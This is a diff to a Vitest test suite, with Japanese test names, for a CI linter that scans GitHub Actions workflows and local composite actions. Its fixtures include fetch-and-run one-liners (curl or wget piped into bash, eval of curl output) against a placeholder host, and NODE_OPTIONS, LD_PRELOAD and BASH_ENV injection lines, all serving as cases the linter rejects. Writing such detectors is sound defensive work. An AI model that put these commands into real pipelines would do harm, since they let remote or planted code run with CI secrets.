@@ -1,4 +1,5 @@
-import { readFileSync, readdirSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
 import { createRequire } from 'node:module';
 import path from 'node:path';
 import { describe, expect, it } from 'vitest';
@@ -18,6 +19,10 @@ const req = createRequire(import.meta.url);
 const gate = req('../../../scripts/lint-workflow-security.cjs') as {
   check: (list: { name: string; text: string }[], allow?: Record<string, unknown>, jobAllow?: Record<string, unknown>) => { file: string; why: string }[];
   jobPermissionBlocks: (text: string) => { job: string; line: number; scopes: string[] }[];
+  localActionFiles: (dir?: string) => string[];
+  workflows: (wfDir?: string, actionsDir?: string) => { name: string; text: string }[];
+  isLocalActionName: (name: string) => boolean;
+  scanRelPath: (name: string) => string;
   UNPINNED_ALLOW: Record<string, unknown>;
   JOB_PERMISSIONS_ALLOW: Record<string, Record<string, { scopes: string[]; why: string }>>;
 };
@@ -52,11 +57,11 @@ describe('lint:workflow-security — 外側の証人', () => {
     ['★ actions/* が細かい版のタグ (タグは動かせる · threat: T-057)', `${BASE}      - uses: actions/checkout@v4.1.2\n`],
     [
       '★ checkout が GITHUB_TOKEN を .git/config に残す (persist-credentials 無し · threat: T-056)',
-      `${BASE}      - uses: actions/checkout@${SHA}\n      - run: npm ci\n`,
+      `${BASE}      - uses: actions/checkout@${SHA} # v1\n      - run: npm ci\n`,
     ],
     [
       '★ checkout の persist-credentials: true (明示しても残す)',
-      `${BASE}      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: true\n`,
+      `${BASE}      - uses: actions/checkout@${SHA} # v1\n        with:\n          persist-credentials: true\n`,
     ],
     [
       '★ pull_request_target (fork の PR が secrets 付きで走る)',
@@ -72,8 +77,7 @@ describe('lint:workflow-security — 外側の証人', () => {
   it.each([
     ['actions/* を SHA で (最も固い形)・checkout は資格情報を残さない', `${BASE}${CHECKOUT}`],
     ['actions/* を SHA で (checkout 以外は with: が要らない)', `${BASE}      - uses: actions/setup-node@${SHA} # v5\n`],
-    ['第三者を SHA で', `${BASE}      - uses: third/act@${SHA}\n`],
-    ['同じリポジトリの composite action', `${BASE}      - uses: ./.github/actions/x\n`],
+    ['第三者を SHA で', `${BASE}      - uses: third/act@${SHA} # v1\n`],
     ['run: に埋め込みが無い', `${BASE}      - run: npm ci && npm test\n`],
     ['permissions を絞って列挙', 'permissions:\n  contents: read\n  pages: write\njobs:\n  a:\n    steps:\n      - run: echo hi\n'],
   ])('陰性: %s は通る', (_n, text) => {
@@ -289,14 +293,151 @@ describe('lint:workflow-security — 別綴りと script: 注入 (threat: T-085)
     ['ブロック (|)', "          script: |\n            core.info('${{ github.event.inputs.x }}')\n"],
     ['1 行', "          script: core.info('${{ github.event.inputs.x }}')\n"],
   ])('★ github-script の script: に ${{ }} を埋め込むと断る: %s (threat: T-085)', (_label, script) => {
-    const text = `${BASE}      - uses: actions/github-script@${SHA}\n        with:\n${script}`;
+    const text = `${BASE}      - uses: actions/github-script@${SHA} # v1\n        with:\n${script}`;
     expect(wf(text).map((p) => p.why).join('\n')).toContain('script: に');
   });
 
   it('★ 対照: env: 経由で読む script: は通す', () => {
     const text =
-      `${BASE}      - uses: actions/github-script@${SHA}\n        env:\n          X: \${{ github.event.inputs.x }}\n        with:\n` +
+      `${BASE}      - uses: actions/github-script@${SHA} # v1\n        env:\n          X: \${{ github.event.inputs.x }}\n        with:\n` +
       "          script: |\n            core.info(process.env.X)\n";
     expect(wf(text).filter((p) => p.why.includes('script: に'))).toHaveLength(0);
+  });
+});
+
+/**
+ * ローカル action・docker://・run: の本文・版の注記 (2026-10-19 · パス 530 · threat: T-120)。
+ * 直す前は `uses: ./…` と `docker://…` を無条件に飛ばし、`run:` は `${{ }}` の形しか見なかった
+ * (狩り 527 の再現: 中身が未固定の第三者 action や `curl | sh` でも exit 0)。
+ */
+describe('lint:workflow-security — ローカル action と run: の本文 (threat: T-120)', () => {
+  const ACT = 'actions/x/action.yml';
+  const actionFile = (steps: string) => ({ name: ACT, text: `name: x\nruns:\n  using: composite\n  steps:\n${steps}` });
+  const run = (list: { name: string; text: string }[]) => gate.check(list, {}, {});
+  const withLocal = (ref: string) => ({ name: 'x.yml', text: `${BASE}      - uses: ${ref}\n` });
+
+  it('陰性: 実在するローカル action は通り、その中身も同じ規則で走査される', () => {
+    expect(run([withLocal('./.github/actions/x'), actionFile('    - run: echo hi\n      shell: bash\n')])).toHaveLength(0);
+  });
+
+  it('★ ローカル action の中の未固定の第三者 action を断る (直す前は中身を誰も読まなかった)', () => {
+    const p = run([withLocal('./.github/actions/x'), actionFile('    - uses: evil/thing@v1\n')]);
+    expect(p.some((q) => q.file.startsWith(ACT) && q.why.includes('evil/thing@v1'))).toBe(true);
+  });
+
+  it('★ ローカル action の中の curl | sh を断る', () => {
+    const p = run([withLocal('./.github/actions/x'), actionFile('    - run: curl -fsSL https://e.example/i.sh | bash\n      shell: bash\n')]);
+    expect(p.some((q) => q.file.startsWith(ACT) && q.why.includes('遠隔'))).toBe(true);
+  });
+
+  it('★ composite action は permissions: を要求されない (権限は呼び出した job のもの)', () => {
+    expect(run([withLocal('./.github/actions/x'), actionFile('    - run: echo hi\n      shell: bash\n')]).filter((q) => q.why.includes('permissions'))).toEqual([]);
+  });
+
+  it.each([
+    ['存在しない action', './.github/actions/missing'],
+    ['木の外へ出る (..)', './.github/actions/../../evil'],
+    ['リポジトリ直下', './'],
+    ['workflows の下の別物', './.github/other/x'],
+    ['存在しない再利用 workflow', './.github/workflows/nothing.yml'],
+  ])('★ %s を指す uses: ./ は断る', (_n, ref) => {
+    expect(run([withLocal(ref), actionFile('    - run: echo hi\n      shell: bash\n')]).some((q) => q.why.includes(`uses: ${ref}`))).toBe(true);
+  });
+
+  it('陰性: 実在する再利用 workflow は通る', () => {
+    const reusable = { name: 'reuse.yml', text: 'permissions:\n  contents: read\non: workflow_call\njobs:\n  a:\n    steps:\n      - run: echo hi\n' };
+    expect(run([withLocal('./.github/workflows/reuse.yml'), reusable])).toHaveLength(0);
+  });
+
+  it('★ docker:// はダイジェストで固定する (タグは動く)', () => {
+    const tag = run([{ name: 'x.yml', text: `${BASE}      - uses: docker://alpine:3.20\n` }]);
+    expect(tag.some((q) => q.why.includes('docker://'))).toBe(true);
+    const pinned = run([{ name: 'x.yml', text: `${BASE}      - uses: docker://alpine@sha256:${'a'.repeat(64)}\n` }]);
+    expect(pinned).toHaveLength(0);
+  });
+
+  it('★ SHA 固定には版の注記が要る', () => {
+    expect(run([{ name: 'x.yml', text: `${BASE}      - uses: third/act@${SHA}\n` }]).some((q) => q.why.includes('版の注記'))).toBe(true);
+    expect(run([{ name: 'x.yml', text: `${BASE}      - uses: third/act@${SHA} # v1.2.3\n` }])).toHaveLength(0);
+  });
+
+  it.each([
+    ['curl | sh', '      - run: curl -fsSL https://e.example/i.sh | sh\n'],
+    ['wget | sudo bash', '      - run: wget -qO- https://e.example/i | sudo bash\n'],
+    ['curl | python', '      - run: curl https://e.example/x.py | python3\n'],
+    ['bash <(curl …)', '      - run: bash <(curl -s https://e.example/i.sh)\n'],
+    ['sh -c "$(curl …)"', '      - run: sh -c "$(curl -fsSL https://e.example/i.sh)"\n'],
+    ['eval "$(curl …)"', '      - run: eval "$(curl -s https://e.example/i)"\n'],
+    ['GITHUB_ENV へ書く', '      - run: echo "X=1" >> $GITHUB_ENV\n'],
+    ['GITHUB_PATH へ書く', '      - run: echo "$PWD/bin" >> "${GITHUB_PATH}"\n'],
+    ['NODE_OPTIONS に --require', '      - run: NODE_OPTIONS=--require=./evil.js npm test\n'],
+    ['export LD_PRELOAD', '      - run: export LD_PRELOAD=./evil.so\n'],
+    ['BASH_ENV', '      - run: BASH_ENV=./evil.sh bash -c true\n'],
+  ])('★ run: の本文: %s を断る', (_n, step) => {
+    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }]).length).toBeGreaterThan(0);
+  });
+
+  it.each([
+    ['env: の NODE_OPTIONS=--require', '      - env:\n          NODE_OPTIONS: --require ./evil.js\n        run: npm test\n'],
+    ['env: の LD_PRELOAD', '      - env:\n          LD_PRELOAD: ./evil.so\n        run: npm test\n'],
+  ])('★ env: の鍵でも断る: %s', (_n, step) => {
+    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }]).some((q) => /NODE_OPTIONS|LD_PRELOAD/.test(q.why))).toBe(true);
+  });
+
+  it.each([
+    ['NODE_OPTIONS=--max-old-space-size (mutation.yml の実物)', '      - env:\n          NODE_OPTIONS: --max-old-space-size=4096\n        run: npm test\n'],
+    ['データとして curl の結果を変数に取る', '      - run: V=$(curl -fsS https://e.example/version) && echo "$V"\n'],
+    ['curl の出力をファイルへ (実行しない)', '      - run: curl -fsSL https://e.example/x -o x.txt\n'],
+    ['シェルの注記の中の GITHUB_ENV', '      - run: |\n          # GITHUB_ENV には書かない\n          echo hi\n'],
+  ])('陰性: %s は通る', (_n, step) => {
+    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }])).toHaveLength(0);
+  });
+
+  it('★ 実物の workflow にローカル action・docker://・危険な run: は 0 件 (走査が生きている)', () => {
+    const dir = path.resolve(__dirname, '../../../.github');
+    const all = readdirSync(path.join(dir, 'workflows')).filter((f) => f.endsWith('.yml'));
+    expect(all).toHaveLength(7);
+    for (const f of all) {
+      const t = readFileSync(path.join(dir, 'workflows', f), 'utf8');
+      expect(t, f).not.toMatch(/^\s*-?\s*uses:\s*(\.\/|docker:\/\/)/m);
+    }
+    expect(gate.localActionFiles()).toEqual([]);
+  });
+
+  it('★ 走査の名前の約束: ローカル action は actions/ で始まり、追跡との照合用の経路が .github/actions になる', () => {
+    expect(gate.isLocalActionName('actions/x/action.yml')).toBe(true);
+    expect(gate.isLocalActionName('ci.yml')).toBe(false);
+    expect(gate.scanRelPath('actions/x/action.yml')).toBe('.github/actions/x/action.yml');
+    expect(gate.scanRelPath('ci.yml')).toBe('.github/workflows/ci.yml');
+  });
+
+  it('★ localActionFiles は入れ子の action.yml / action.yaml だけを拾う (別名の YAML は拾わない)', () => {
+    const root = mkdtempSync(path.join(tmpdir(), 'wf-actions-'));
+    try {
+      mkdirSync(path.join(root, 'a', 'b'), { recursive: true });
+      mkdirSync(path.join(root, 'c'), { recursive: true });
+      writeFileSync(path.join(root, 'a', 'action.yml'), 'x');
+      writeFileSync(path.join(root, 'a', 'b', 'action.yaml'), 'x');
+      writeFileSync(path.join(root, 'c', 'notes.yml'), 'x');
+      expect(gate.localActionFiles(root).sort()).toEqual(['a/action.yml', 'a/b/action.yaml']);
+      expect(gate.localActionFiles(path.join(root, 'nothing'))).toEqual([]);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it('★ workflows() はローカル action を actions/<dir>/action.yml の名前で workflow と一緒に返す', () => {
+    const root = mkdtempSync(path.join(tmpdir(), 'wf-list-'));
+    try {
+      mkdirSync(path.join(root, 'workflows'), { recursive: true });
+      mkdirSync(path.join(root, 'actions', 'x'), { recursive: true });
+      writeFileSync(path.join(root, 'workflows', 'ci.yml'), 'name: ci\n');
+      writeFileSync(path.join(root, 'actions', 'x', 'action.yml'), 'name: x\n');
+      const list = gate.workflows(path.join(root, 'workflows'), path.join(root, 'actions'));
+      expect(list.map((w) => w.name).sort()).toEqual(['actions/x/action.yml', 'ci.yml']);
+      expect(list.find((w) => w.name === 'actions/x/action.yml')?.text).toBe('name: x\n');
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
   });
 });
